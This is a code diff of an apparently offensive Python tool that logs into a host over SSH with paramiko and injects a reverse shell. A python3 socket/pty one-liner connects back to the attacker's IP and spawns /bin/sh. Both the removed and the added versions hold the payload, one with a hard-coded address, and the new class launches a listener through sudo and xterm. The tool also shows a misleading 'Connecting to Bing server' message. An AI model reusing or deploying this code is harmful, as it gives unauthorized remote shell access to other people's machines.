@@ -1,32 +1,35 @@
 import paramiko
-from multiprocessing import Process
+import subprocess
+from textual.widgets import TextLog
+import socket
 import os
-import getpass
-from threading import Thread
-from RevShListener import listener
 
-def ssh_command(ip,port,user,passwd,cmd):
-    client=paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(ip,port=port,username=user,password=passwd)
-    _,stdout,stderr=client.exec_command(cmd)
-    output=stdout.readlines() + stderr.readlines()
-    if output:
-        print("---Output---")
-        for line in output:
-            print(line.strip())
+class OpenSH():
+    def __init__(self) -> None:
+        pass
 
-def SSH_setup():
-    user=input("Username: ")
-    password=getpass.getpass()
-    ip=input("Enter server IP: ")
-    port=input("Enter port:") or "22"
-    cmd=input("enter command:") or "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.20.212.122\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
-    ssh_command(ip,port,user,password,cmd)
-
-if __name__=="__main__":
-    p="4242"
-    l=Thread(target=listener)
-    ssh=Thread(target=SSH_setup)
-    l.start()
-    ssh.start()
+    def ssh_command(self,ip:str,t:TextLog,user:str,passwd:str,srvP,p):
+        """Start and inject a reverse shell"""
+        c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        c.connect(("8.8.8.8", 80))
+        ipv4=c.getsockname()[0]
+        try:
+            os.environ["DISPLAY"] =":0.0"
+            f=subprocess.check_output(["id -un 1000"],shell=True)
+            t.write(f.decode().strip())
+            t.write("Connecting to SSH server . . .")
+            d=subprocess.Popen([f"sudo -u {f.decode().strip()} xterm -e python3 RevShListener.py {srvP}"],shell=True)
+            client=paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(ip,port=p,username=user,password=passwd)
+            t.write("Connecting to Bing server server . . .")
+            _,stdout,stderr=client.exec_command(f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ipv4}\",{srvP}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
+            t.write("Connected")
+            output=stdout.readlines() + stderr.readlines()
+            t.write("done")
+            if output:
+                t.write("---Output---")
+                for line in output:
+                        t.write(line.strip())
+        except:
+             t.write("Error: Invalid Data or broken connection")
